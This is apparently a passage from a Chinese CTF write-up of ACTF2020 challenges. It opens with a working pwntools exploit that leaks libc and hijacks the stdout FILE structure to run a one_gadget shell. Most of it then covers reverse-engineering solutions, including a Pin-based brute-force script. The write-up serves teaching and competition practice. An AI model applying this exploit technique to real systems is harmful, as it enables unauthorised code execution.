0x7fce72a436f0 <_IO_2_1_stdout_+208>:	0x0000000000000000	0x00007fce72a416e0
0x7fce72a43700 <stderr>:	0x00007fce72a43540	0x00007fce72a43620
0x7fce72a43710 <stdin>:	0x00007fce72a428e0	0x00007fce7269eb70
```

`read`读的数据足以修改`_IO_2_1_stdout_`的`_IO_FILE`结构体

`write`打印的数据足以泄漏`stderr`中的`_IO_2_1_stderr_`地址

> `_IO_2_1_stderr_`在libc中

利用的思路很简单，先`show(-16)`泄漏libc，再`mod(-16)`覆盖`_IO_2_1_stdout_`的`_IO_FILE`结构体，`mod`函数执行完毕后会调用`puts`打印菜单，于是会用到`_IO_2_1_stdout_`，只要把其中的函数指针改写为`one_gadget`即可getshell

关于`_IO_FILE`结构体，[这篇](https://xz.aliyun.com/t/3344)文章有介绍，讲的比较明白

我的做法就比较简单粗暴了......直接跟进`puts`函数，通过漏洞布置合适的数据，让程序顺利执行到这里：

```assembly
   0x7fce726ed788 <puts+248>    cmp    eax, -1
   0x7fce726ed78b <puts+251>    je     puts+152 <0x7fce726ed728>
    ↓
   0x7fce726ed728 <puts+152>    mov    rax, qword ptr [rdi + 0xd8]
   0x7fce726ed72f <puts+159>    mov    rdx, rbx
   0x7fce726ed732 <puts+162>    mov    rsi, r12
 ► 0x7fce726ed735 <puts+165>    call   qword ptr [rax + 0x38] <0x7fce726f71e0>
```

这里的`rax + 0x38`是可以覆盖到的，向其中布置`one_gadget`即可

> 由于不同`libc`版本的`puts`函数具体代码不同，但是大同小异
> 我本地环境是`libc_2.29`，这题远程的环境是`libc_2.23`，都可以用上述方法成功getshell

exp如下(调试`libc_2.23`时需要`Ubuntu16.04`环境~真香)：

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './complaint'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def mod(index, cont):
    sla('Your choice: ','2')
    sla('The complaint index you want to modify:\n',str(index))
    sla('Input your complaint:',cont)

def show(index):
    sla('Your choice: ','4')
    sla('The complaint index you want to show:\n',str(index))
    
# elf, libc

show(-16)
data = rc()
stderr = uu64(data[448+17:448+6+17])
libc_base = stderr - libc.sym['_IO_2_1_stderr_']
info_addr('libc_base',libc_base)

if is_local:
    one_gadget = libc_base + 0x106ef8
if is_remote:
    one_gadget = libc_base + 0xf66f0
    #  0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
    #constraints:
    #  [rcx] == NULL || rcx == NULL
    #  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL

# debug()

if is_local:
    payload = p64(stderr)*44+p64(stderr+7936)+p64(stderr)*7+p64(0xffffffff)+p64(stderr+0x1000)*400+p64(one_gadget)*100
    #                                  1                           -1          cmp rax,rcx               func
if is_remote:
    payload = p64(stderr)*7+p64(one_gadget)+p64(stderr)*10+p64(stderr+4672)+p64(stderr)*6+p64(0xffffffff)+p64(stderr)*31+p64(stderr+8)+p64(0)*200
    #                             func                               1                            -1                           rbp
mod(-16,payload)

p.interactive()
```

------

# Re

re题目都比较有意思，不过还是剩了两道题没做，有一到题pwn和re的结合体，然鹅并没有看懂出题人什么意思...还有一道TEA加密，唉，一看到密码就脑壳疼，果断放弃...

## Here_you_are

 - 题目描述：

   > This is your flag. Here you are.
   > IDA and OD are really my friends. Do you want to play with them too?

 - 题目地址：[Sign_up.exe](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Here_you_are/Sign_up.exe)

 - 考察点：没有

 - 难度：入门

 - 分值：100

 - 完成人数：10

直接找字符串就行:) 

> IDA and OD are really my friends, but I just want to play with radare2.

```shell
19:42 taqini@q /home/taqini/Downloads/actf/re/sign
% rabin2 -zz Sign_up.exe | grep {
61  0x00001426 0x00403026 6   7    .rdata        ascii   %s{...
62  0x0000142d 0x0040302d 24  25   .rdata        ascii   ACTF{Reverse_w3lcome_:)}
```



## Rome

 - 题目描述：Julius
 - 题目地址：[rome.exe](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/rome/rome.exe)
 - 考察点：逆向分析
 - 难度：简单
 - 分值：100
 - 完成人数：6

凯撒加密+大小写互换，主要代码如下：

```c
for ( i = 0; i <= 15; ++i ){
    if ( *(&v1 + i) > '@' && *(&v1 + i) <= 'Z' )
        *(&v1 + i) = (*(&v1 + i) - '3') % 26 + 'A';
    if ( *(&v1 + i) > '`' && *(&v1 + i) <= 'z' )
        *(&v1 + i) = (*(&v1 + i) - 'O') % 26 + 'a';
}

for ( i = 0; i <= 15; ++i ){
	result = *(&v15 + i);
	if ( *(&v1 + i) != result )
		return result;
}
result = printf("You are correct!");
```

解密(懒得推算了，反正凯撒后的字母是一对一映射的，直接搞到映射表反解即可)：

```python
#!/usr/bin/python
#__author__:TaQini

import string as s

def enc(ss):
	ll = []
	for i in ss:         
		if i in s.ascii_lowercase:
			ll.append(chr((ord(i)-ord('O'))%26+ord('a')))
		elif i in s.ascii_uppercase:
			ll.append(chr((ord(i)-ord('3'))%26+ord('A')))
		else:
			ll.append(i)
	return ll
ans = 'Qsw3sj_lz4_Ujw@l'
d={}
for i in s.ascii_uppercase:
	d[enc(i)[0]]=i
for i in s.ascii_lowercase:
	d[enc(i)[0]]=i

print d

flag = ''
for i in ans:
	if i in d:
		flag += d[i]
	else:
		flag += i

print flag
# Cae3ar_th4_Gre@t
```



## game

- 题目描述：打比赛打累了吧？来玩个小游戏？
- 题目地址：[game.exe](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/game/game.exe)
- 考察点：逆向分析，~~数独游戏技能~~
- 难度：简单
- 分值：100
- 完成人数：5

数独游戏，主要代码如下：

```c
  abc_to_num(user_input);
  fill_map(user_input, &map);
  check_map(&map);
  puts("Congratulations, you successfully solved this little problem!");
  printf(aFlag, buf);
```

流程大概是将输入的`abcdefghi`转成数字`123456789`，然后按顺序填到棋盘中，最后分别检查每行、每列、每个九宫格内的数字是否合法。

这题只要分析出是数独游戏就好办了，`fill_map`这个函数中有个循环跑了81次，`check_map`函数中又有`9x9`的循环，由此可以想到这是个`9x9`的二维数组，到这里差不多就知道是数独了，dump出棋盘，玩儿一局数独就能拿到flag，美滋滋~

棋盘：

```c
2 5 0 1 4 0 6 8 9 
0 0 8 9 0 6 2 0 5 
6 7 9 2 5 8 1 4 3 
3 1 2 5 8 4 7 0 0 
0 8 0 7 9 0 5 3 2 
5 9 7 0 6 2 8 1 0 
7 2 4 0 1 3 0 5 8 
8 6 5 4 7 9 3 0 1 
9 3 1 8 2 5 4 0 0 
```

脚本：

```python
#!/usr/bin/python
#__author__:TaQini

codemap_s = '2 5 0 1 4 0 6 8 9 0 0 8 9 0 6 2 0 5 6 7 9 2 5 8 1 4 3 3 1 2 5 8 4 7 0 0 0 8 0 7 9 0 5 3 2 5 9 7 0 6 2 8 1 0 7 2 4 0 1 3 0 5 8 8 6 5 4 7 9 3 0 1 9 3 1 8 2 5 4 0 0'
codemap = codemap_s.split()

def show():
    cnt = 0 
    cnt0 = 0
    for i in codemap:
        if i=='0':
            cnt0 += 1
        cnt += 1
        print i,
        if cnt %9==0:
            print ''
    print 'count of 0: %s'%cnt0
show()

user = [3,7,1,4,3,7,9,6,4,6,1,3,4,6,9,2,6,7]

print user

new_map = []

pos = 0
for i in codemap:
    if i == '0' and pos < len(user):
        new_map.append(str(user[pos]))
        pos += 1
    else:
        new_map.append(i)

flag = []
for i in user:
    flag.append(chr(i+96))

codemap = new_map
show()

print "flag{%s}"%''.join(flag)
```

> p.s.数独真好玩儿



## usualCrypt

- 题目描述：这个加密真的很常见，不信你看看
- 题目地址：[base.exe](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/usualCrypt/base.exe)
- 考察点：逆向分析
- 难度：简单
- 分值：100
- 完成人数：3
  

输入字符串，经过自定义的`base64`加密后，与密文比对，解密密文即flag

### 加密

首先是`base64`换表

```c
signed int swap_Base_table(){
  signed int result; // eax
  char tmp; // cl

  result = 6;
  do{
    tmp = array_2[result];
    array_2[result] = array_1[result];
    array_1[result++] = tmp;
  }
  while ( result < 15 );
  return result;
}
```

> 原表：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
> 新表：ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/

然后就是正常的`base64`加密

最后还有个密文大小写互换

```c
int __cdecl swap_Upper_Lower(const char *buf){
  __int64 i; // rax
  char chr; // al

  i = 0i64;
  if ( strlen(buf) != 0 ){
    do{
      chr = buf[HIDWORD(i)];
      if ( chr < 97 || chr > 122 ){
        if ( chr < 65 || chr > 90 )
          goto LABEL_9;
        LOBYTE(i) = chr + 0x20;
      }
      else{
        LOBYTE(i) = chr - 0x20;
      }
      buf[HIDWORD(i)] = i;
LABEL_9:
      LODWORD(i) = 0;
      ++HIDWORD(i);
    }
    while ( HIDWORD(i) < strlen(buf) );
  }
  return i;
}
```


### 解密

解密就照着加密步骤反过来操作就好

首先，生成`base64`编码表

```c
char array[] = "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x00";

char *array_1 = array;
char *array_2 = array+10;

signed int swap(){
  signed int result; // eax
  char v1; // cl

  result = 6;
  do{
    v1 = array_2[result];
    array_2[result] = array_1[result];
    array_1[result++] = v1;
  }
  while ( result < 15 );
  return result;
}

int main(){
    printf("%s\n",array);
    //printf("%s\n",array_1);
    //printf("%s\n",array_2);
    swap();
    printf("%s\n",array);
    //printf("%s\n",array_1);
    //printf("%s\n",array_2);
}
```

然后是密文大小写互换

```python
#!/usr/bin/python
#__author__:TaQini

enced = [0x7A, 0x4D, 0x58, 0x48, 0x7A, 0x33, 0x54, 0x49, 0x67, 0x6E, 0x78, 0x4C, 0x78, 0x4A, 0x68, 0x46, 0x41, 0x64, 0x74, 0x5A, 0x6E, 0x32, 0x66, 0x46, 0x6B, 0x33, 0x6C, 0x59, 0x43, 0x72, 0x74, 0x50, 0x43, 0x32, 0x6C, 0x39]
chipertext = ''.join([chr(i) for i in enced])

print chipertext

# swap uppercase and lowercase
def swapUL(buf):
    tmp = ''
    for i in buf:
        c = ord(i)
        if c < 97 or c > 122:
            if c < 65 or c > 90:
                tmp += i
                continue
            tmp += chr(c+0x20)
        else:
            tmp += chr(c-0x20)
    return tmp

newc = swapUL(chipertext)
print newc
```

最后进行`base64`解密

```python
table = "ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/"
print table

l=[]
for i in newc:
    l.append(table.index(i))
# print l

s=''
for i in l:
    b = bin(i)[2:].rjust(6,'0')
    s += b
    # print(b)
# print s

h = hex(int(s,2))[2:-1]
# print h
print h.decode('hex')
```



## oruga

- 题目描述：

  > “只要我们不停下脚步，道路就会不断延伸……”
  > “团长，你在做什么啊团长！”
  > “我们不需要最后的落脚处，只要不断前进就行了。只要不停止，道路就会不断延伸。因为，我不会停下来的！只要你们不停下来，那前面一定就有我！所以啊……不要停下来啊……”

- 题目地址：[oruga](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/oruga/oruga)

- 考察点：逆向分析
- 难度：简单
- 分值：100
- 完成人数：1

走迷宫的小游戏，只要逆出了游戏规则就简单了...(有点像是神奇宝贝绿宝石里面那个溜冰游戏：D)

游戏地图大小为16x16，如下(其中`.`代表`\x00`)：

```
....#.......####
...##...OO......
........OO.PP...
...L.OO.OO.PP...
...L.OO.OO.P....
..LL.OO....P....
.....OO....P....
#...............
............#...
......MMM...#...
.......MMM....EE
...0.M.M.M....E.
..............EE
TTTI.M.M.M....E.
.T.I.M.M.M....E.
.T.I.M.M.M!...EE
```

### 游戏规则

1. 地图中`.`(`\x00`)表示可走的路，`！`表示终点，其余的字符表示障碍物
2. 起点为(0,0)
3. 每次选择一个方向，一直走到遇到障碍物为止
4. 走出上下左右任何一个边界，即判负
5. 走到终点，赢得游戏

通过输入字符表示上下左右方向，对应规则如下：

> W - Up
> E - Right
> M - Down
> J - Left

按照游戏规则走到终点即可（`MEWEMEWJMEWJM`）

### 代码分析

下面分析游戏规则对应的代码：

规则1,2,5比较容易，看地图就能猜出来，规则3,4代码如下：

```C
while ( !map[ptr] )                           // add op while map[ptr] is NULL
{
    if ( op == -1 && !(ptr & 0xF) )           // LEFT  - not 0,16,32... (col 0)
        return 0LL;
    if ( op == 1 && ptr % 16 == 15 )          // RIGHT - not 15,31,47...(col 15)
        return 0LL;
    if ( op == 16 && (ptr - 240) <= 0xF )     // DOWN  - not <= 255 (row 15)
        return 0LL;
    if ( op == -16 && (ptr + 15) <= 0x1E )    // UP    - not <= 15  (row 0)
        return 0LL;
    ptr += op;
}
```

其中`while ( !map[ptr] )  `对应规则3，循环中的代码为边界检查，对应规则4

这题是第二周放出来的，不知道为啥没人做...



## easyre

- 题目描述：Nutshell

- 题目地址：[easyre.exe](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/easyre/easyre.exe)

- 考察点：逆向分析
- 难度：简单
- 分值：200
- 完成人数：2

字符串判断部分代码如下：

```c
  for ( i = 0; i <= 11; ++i ){
    // buf[i]!=charset[flag[i]-1]
    if ( *(&buf0 + i) != charset[*(&flag6_ + i) - 1] )
      return 0;
  }
  printf("You are correct!");
```

判断条件：`buf[i]!=charset[flag[i]-1]`

`buf`和`charset`都是直接给的，解`flag`即可：

```python
#!/usr/bin/python
#__author__:TaQini

buf = [0x2A, 0x46, 0x27, 0x22, 0x4E, 0x2C, 0x22, 0x28, 0x49, 0x3F, 0x2B, 0x40]

charset = [0x7E, 0x7D, 0x7C, 0x7B, 0x7A, 0x79, 0x78, 0x77, 0x76, 0x75, 0x74, 0x73, 0x72, 0x71, 0x70, 0x6F, 0x6E, 0x6D, 0x6C, 0x6B, 0x6A, 0x69, 0x68, 0x67, 0x66, 0x65, 0x64, 0x63, 0x62, 0x61, 0x60, 0x5F, 0x5E, 0x5D, 0x5C, 0x5B, 0x5A, 0x59, 0x58, 0x57, 0x56, 0x55, 0x54, 0x53, 0x52, 0x51, 0x50, 0x4F, 0x4E, 0x4D, 0x4C, 0x4B, 0x4A, 0x49, 0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41, 0x40, 0x3F, 0x3E, 0x3D, 0x3C, 0x3B, 0x3A, 0x39, 0x38, 0x37, 0x36, 0x35, 0x34, 0x33, 0x32, 0x31, 0x30, 0x2F, 0x2E, 0x2D, 0x2C, 0x2B, 0x2A, 0x29, 0x28, 0x27, 0x26, 0x25, 0x24, 0x23, 0x20, 0x21, 0x22, 0]

# buf[i] == charset[flag[i]-1]
# print charset.index(0x7E)
s = ''
for i in buf:
    # print charset.index(i)+1
    s +=  chr(charset.index(i)+1)
s = 'ACTF{%s}'%s
print s
```



## SoulLike

- 题目描述：玩魂like游戏最重要的品质就是，执着（M）
- 题目地址：[SoulLike](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/SoulLike/SoulLike)
- 考察点：逆向分析、爆破
- 难度：中等
- 分值：200
- 完成人数：2

首先flag格式为`actf{xxxxxxxxxxxx}` (12个x)，主要代码如下：

```c
  for ( j = 0; j <= 11; ++j )
    buf[j] = flag[j + 5];
  v3 = (unsigned __int8)sub_83A(buf) && v12 == '}' ? 1 : 0;
  if ( v3 ){
    printf("That's true! flag is %s", flag);
    result = 0LL;
  }
```

`sub_83A(buf)`这个函数贼长，汇编两万多行，不知道出题人怎么搞出来的。。。

略略的看一下，一堆的异或操作，大概的操作是：
- 将`xxxxxxxxxxxx`**逐个字节**、**反反复复**的异或，最终和下面的正确结果比对

> 0x7E, 0x32, 0x25, 0x58, 0x59, 0x6B, 0x35, 0x6E, 0x0, 0x13, 0x1E, 0x38

xor太多了，于是尝试爆破，手动爆破又太累了，于是请出PIN来帮忙(滑稽)

### Pin指令数统计爆破
爆破原理：

> 对于逐字节判断字符串是否正确的题目，输入正确flag与错误flag时，程序执行的指令数不同
> 因此分析程序在不同输入时，执行指令数的差异，即可可逐字节得出正确flag

不想花时间自己写`pintool`，于是直接用pin新手教学中的`inscount0.so`

爆破时是这个亚子：

```shell
% ./taqini.py
solved: actf{b0Nf|Re_LiT
solved:(maybe) actf{b0Nf|Re_LiTk
solved:(maybe) actf{b0Nf|Re_LiTt
solved:(maybe) actf{b0Nf|Re_LiTA
solved:(maybe) actf{b0Nf|Re_LiTJ
solved:(maybe) actf{b0Nf|Re_LiT!
```

可能是处理器有优化，解出来的结果不唯一，因此每个结果出来都要去gdb试一下

爆破脚本如下（写的很烂...师傅门凑合看，需要下载并配置PIN）：

```python
#!/usr/bin/python
#__author__:TaQini

import sys
import string as s
from subprocess import *
import re

#configure by the user
PINBASEPATH = "/home/taqini/ctf_tools/pin-3.11-97998-g7ecce2dac-gcc-linux"
PIN = "%s/pin" % PINBASEPATH
INSCOUNT32 = "%s/source/tools/ManualExamples/obj-ia32/inscount0.so" % PINBASEPATH
INSCOUNT64 = "%s/source/tools/ManualExamples/obj-intel64/inscount0.so" % PINBASEPATH
INSCOUNT = INSCOUNT64

def pin(passwd,filename):
    try:
        command = PIN + " -t " + INSCOUNT + " -- ./"+ filename + " ; cat inscount.out"
        p = Popen(command,shell=True,stderr=PIPE,stdin=PIPE,stdout=PIPE)
        output = p.communicate(input=passwd)[0]
    except:
        print "Unexpected error:", sys.exc_info()[0]
        raise
    output = re.findall(r"Count ([\w.-]+)", output)

    return int(''.join(output))

filename = './SoulLike'
charset='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()+,-./:;<=>?@[]^_`{|}~ '

# append a char after right ...
fix = 'actf{b0Nf|Re_LiT'

print "solved: "+fix 
while True:
    base = pin(fix+'a',filename)
    for i in charset:
        diff = abs(pin(fix+i,filename)-base)
        print i,"diff: %04d"%diff
        sys.stdout.write("\033[F")
        if diff >= 4: 
            print 'solved:(maybe)',fix+i
    fix += i

```



## Splendid_MineCraft

- 题目描述：**S**plendid **M**ine**C**raft!
- 题目地址：[Splendid_MineCraft.exe](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/Splendid_MineCraft.exe)
- 考察点：动态调试（后来放了hint，原来叫做自修改代码...*SMC self-Modifying Code*）
- 难度：中等
- 分值：200
- 完成人数：2

面函数如下：

```c
int sub_401080(){
  char *part1; // eax
  char *part2; // eax
  char *part3; // ST28_4
  signed int i; // [esp+14h] [ebp-54h]
  int v5; // [esp+20h] [ebp-48h]
  char Str1; // [esp+24h] [ebp-44h]
  char endc; // [esp+3Dh] [ebp-2Bh]
  int p2_0; // [esp+44h] [ebp-24h]
  __int16 p2_2; // [esp+48h] [ebp-20h]
  char p3_0[4]; // [esp+4Ch] [ebp-1Ch]
  __int16 p3_2; // [esp+50h] [ebp-18h]
  int pl_0; // [esp+54h] [ebp-14h]
  __int16 p1_4; // [esp+58h] [ebp-10h]
  int p1_0_; // [esp+5Ch] [ebp-Ch]
  __int16 p1_4_; // [esp+60h] [ebp-8h]

printf(&aS, "Welcome to ACTF_Splendid_MineCraft!");
    scanf(&aS2, &Str1);
    if ( strlen(&Str1) == 26 ){
      if ( !strncmp(&Str1, "ACTF{", 5u) && endc == '}' ){
        endc = 0;
        part1 = strtok(&Str1, "_");
        pl_0 = *(part1 + 5);                      // ACTF{123456_abcdef_ABCDEF}
                                                  // 01234567890123456789012345
        p1_4 = *(part1 + 9);
        p1_0_ = *(part1 + 5);
        p1_4_ = *(part1 + 9);
        part2 = strtok(0, "_");
        p2_0 = *part2;
        p2_2 = *(part2 + 2);
        part3 = strtok(0, "_");
        *p3_0 = *part3;
        p3_2 = *(part3 + 2);
        ptr = func;
        if ( func(&pl_0) ){
          v5 = SBYTE2(p1_0_) ^ SHIBYTE(p1_4_) ^ p1_0_ ^ SHIBYTE(p1_0_) ^ SBYTE1(p1_0_) ^ p1_4_;
          for ( i = 0x100; i < 0x1F0; ++i )
            loc_405018[i] ^= v5;
          JUMPOUT(__CS__, &loc_405018[256]);
        }
        printf("Wrong\n");
      }
      else{
        printf("Wrong\n");
      }
    }
    else{
      printf("Wrong\n");
    }
    return 0;
  }
```

### 0x0 确定flag结构

flag长度为26字节，除去`ACTF{}`还剩下20字节的`flag`，使用`strtok`将20字节的`flag`分为三部分，其中有2字节是`_`，还剩下18字节分析一下，不难看出每部分6字节...

flag结构为`ACTF{123456_abcdef_ABCDEF}`

### 0x1 动态分析

检查flag第一部分和第二部分的函数都在数据段，而且是经过异或编码的，于是只能动态调试

#### 第一部分

第一部分的函数如下（解码前）：

![p1_encode](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_encode.png)

这个函数解码的操作是异或`0x72`，解码后：

![p1_dec](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_decode.png)

然后，直接去找字符比较的cmp指令：

![p1_cmp](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_cmp.png)

输入的字符串是`ACTF{123456_abcdef_ABCDEF}`，这里是逐字节的明文对比，比较简单

对比6个字符后，能得到flag第一部分：`yOu0y*`

#### 第二部分

检查flag第二部分的函数需要通过刚解出的flag第一部分来解码，解码的操作是异或`yOu0y*`这六字节异或后的结果

因此，将输入的字符串改为`ACTF{yOu0y*_abcdef_ABCDEF}`，重新调试

![p2_cmp](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_cmp.png)

这里不是明文对比，输入的`a`被加密成了`0xc1`，加密过程如下：

![p2_encode](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_enc.png)

加密：

> `y = eax[ ( x & 0xff) ^ 0x83 + edi ]`

其中`edi`用作计数范围是0~5，`eax`可以看出是个数组：

![p2_map](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_tbl.png)

解密：

> `x = eax.offset(y) ^ (0x83 + edi)`

其中`y`对应的是上上上面那张图中蓝框框起来的部分（数据夹在代码中hhhh）

> `y = [0x30, 0x4, 0x4, 0x3, 0x30, 0x63]`

根据`y`的值查表，得到对应的偏移量，即可解得`x`：

![p2_dec](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_dec.png)

flag第二部分：`knowo3`

#### 第三部分

本来以为第三部分会更困难，没想到是直接用的`strcmp`明文对比...

![p3](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p3_cmp.png)

flag第三部分：`5mcsM<`



## ding

- 题目描述：Ding! 
- 题目地址：[ding](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/ding/ding)
- 考察点：多线程、动态调试
- 难度：简单
- 分值：250
- 完成人数：1

主要代码如下，其中`dest`位于`bss`段，`dest`函数在程序开启后初始化，所以静态分析不出来，要动态调

```c
int __cdecl check(char *s){
  signed int len_30; // [esp+4h] [ebp-14h]
  signed int i; // [esp+Ch] [ebp-Ch]

  if ( strlen(s) <= 0x10 )
    return 0;
  while ( !dest )
    sleep(1000u);
  (dest)(s);
  len_30 = strlen(enc_flag);
  for ( i = 0; i < len_30; ++i ){
    if ( i != len_30 - 1 && !s[i] || s[i] != enc_flag[i] )
      return 0;
  }
  return 1;
}
```

由于用了多线程，直接用gdb调试的话不行

```shell
pwndbg> b main
Breakpoint 1 at 0xb56
pwndbg> r
Starting program: /home/taqini/Downloads/actf/re/Ding/ding 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0xf7fcf600 (LWP 32676) fork to child process 32680]
[New inferior 2 (process 32680)]
[Detaching after fork from parent process 32676]
--- The quick brown fox knocked at the lazy dog's house ---
[?]Password please:
[Inferior 1 (process 32676) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0xf7db0b40 (LWP 32685)]
[Thread 0xf7db0b40 (LWP 32685) exited]
[New Thread 0xf75afb40 (LWP 32686)]
[Thread 0xf75afb40 (LWP 32686) exited]
[Inferior 2 (process 32680) exited with code 01]
```

所以改用`gdb attach`：

```shell
% ./ding 
--- The quick brown fox knocked at the lazy dog's house ---
[?]Password please:
^Z
[1]  + 32732 suspended  ./ding

% fg
[1]  + 32732 continued  ./ding

```

```shell
% gdb attach 32732 
```

动态调试的时候为了方便分析，可以`dump`出`dest()`函数

```shell
pwndbg> dump binary memory 0x565790e0 0x5657914b
```

扔到ida里反编译：

```c
void __cdecl __noreturn sub_0(int a1){
  int i; // [esp-8h] [ebp-8h]

  for ( i = 0; *(_BYTE *)(i + a1); ++i )
  {
    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ 0x47;
    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) + 6;
    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) - 2;
  }
  JUMPOUT(MEMORY[0x6B]);
}
```

很简单的加密，解密即可：

```python
#！/usr/bin/python
#__author__:TaQini

enc_flag = [0x0A, 0x08, 0x17, 0x05, 0x40, 0x37, 0x33, 0x39, 0x26, 0x2A, 0x27, 0x1C, 0x32, 0x76, 0x1C, 0x25, 0x36, 0x2D, 0x1C, 0x7E, 0x39, 0x2A, 0x2D, 0x27, 0x73, 0x7A, 0x6F, 0x7A, 0x72, 0x3E]

flag = []
for i in enc_flag:
    flag.append(chr((i+2-6)^0x47))

print ''.join(flag)
```

这题也不难，不知道为啥也没人做...



## UniverseFinalAnswer

- 题目描述：

  > 超级计算机“deep thought”用700万年的思考得出了宇宙终极问题的答案，但是答案却遗失了。而你则是需要从它的程序中找出终极答案到底是什么。

- 题目地址：[UniverseFinalAnswer](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/UniverseFinalAnswer/UniverseFinalAnswer)

- 考察点：**视力**、解方程

- 难度：中等

- 分值：300

- 完成人数：3

解十元一次方程组，输入的字符串作为十个变量，虽然flag由两部分组成，但是看程序逻辑，只要解方程对了就可以了：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3){
  __int64 v4; // [rsp+0h] [rbp-A8h]
  char key_string; // [rsp+20h] [rbp-88h]
  unsigned __int64 v6; // [rsp+88h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  __printf_chk(1LL, "Please give me the key string:", a3);
  scanf("%s", &key_string);
  if ( equation(&key_string) ){
    key_xor_to_int_str(&key_string, &key_string, &v4);
    // key_string 按位异或,再异或9，十进制结果转为字符串作为printf第4个参数,并没有什么用
    __printf_chk(1LL, "Judgement pass! flag is actf{%s_%s}\n", &key_string);
  }
  else{
    puts("False key!");
  }
  return 0LL;
}
```

flag格式:`actf{part1_part2}`

> part1:方程的十个变量
> part2:十个变量异或再异或9后的结果

### 解方程

方程部分代码如下：

```c
bool __fastcall formal(char *a1){
  int x2; // ecx
  int x1; // esi
  int x3; // edx
  int x4; // er9
  int x5; // er11
  int x7; // ebp
  int x6; // ebx
  int x8; // er8
  int x9; // er10
  bool result; // al
  int x10; // [rsp+0h] [rbp-38h]

  x2 = a1[1];
  x1 = *a1;
  x3 = a1[2];
  x4 = a1[3];
  x5 = a1[4];
  x7 = a1[6];
  // 此处想打出题人,x6,x7居然反着写，导致解方程一直不对，我debug了半天才找出来。。。
  x6 = a1[5];
  x8 = a1[7];
  x9 = a1[8];
  result = 0;
  if ( -85 * x9 + 58 * x8 + 97 * x7 + x6 + -45 * x5 + 84 * x4 + 95 * x1 - 20 * x2 + 12 * x3 == 12613 )
  {
    x10 = a1[9];
    if ( 30 * x10 + -70 * x9 + -122 * x7 + -81 * x6 + -66 * x5 + -115 * x4 + -41 * x3 + -86 * x2 - 15 * x1 - 30 * x8 == -54400
      && -103 * x10 + 120 * x8 + 108 * x6 + 48 * x4 + -89 * x3 + 78 * x2 - 41 * x1 + 31 * x5 - (x7 << 6) - 120 * x9 == -10283
      && 71 * x7 + (x6 << 7) + 99 * x5 + -111 * x3 + 85 * x2 + 79 * x1 - 30 * x4 - 119 * x8 + 48 * x9 - 16 * x10 == 22855
